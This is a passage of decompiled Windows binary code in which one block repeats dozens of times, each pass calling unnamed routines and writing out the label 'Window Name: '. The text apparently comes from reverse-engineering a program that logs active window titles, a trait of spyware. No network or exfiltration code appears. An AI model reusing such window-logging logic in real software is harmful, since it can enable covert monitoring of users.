uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar6, uVar13, uVar14, uVar9, uVar15, uVar10, uVar11\n                 , uVar8);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar15, uVar16, uVar17, uVar12, uVar6, uVar13, uVar14\n                 , uVar9);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar6, uVar10, uVar11, uVar8, uVar15, uVar16, uVar17\n                 , uVar12);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar12 = 4;\n    uVar17 = 0;\n    uVar16 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar16, uVar17, uVar12, uVar15, uVar13, uVar14, uVar9, uVar6, uVar10, uVar11\n                 , uVar8);\n    uVar6 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar8 = 4;\n    uVar11 = 0;\n    uVar10 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar10, uVar11, uVar8, uVar6, uVar16, uVar17, uVar12, uVar15, uVar13, uVar14\n                 , uVar9);\n    uVar15 = 10;\n    fcn.00402920();\n    fcn.00401da0();\n    uVar9 = 4;\n    uVar14 = 0;\n    uVar13 = 0;\n    (*pcVar2)();\n    fcn.00402580(0x450d00, \"Window Name: \", uVar13, uVar14, uVar9, uVar15, uVar10, uVar11, uVar8, uVar6, uVar16, uVar17\n                 , uVar12);\n    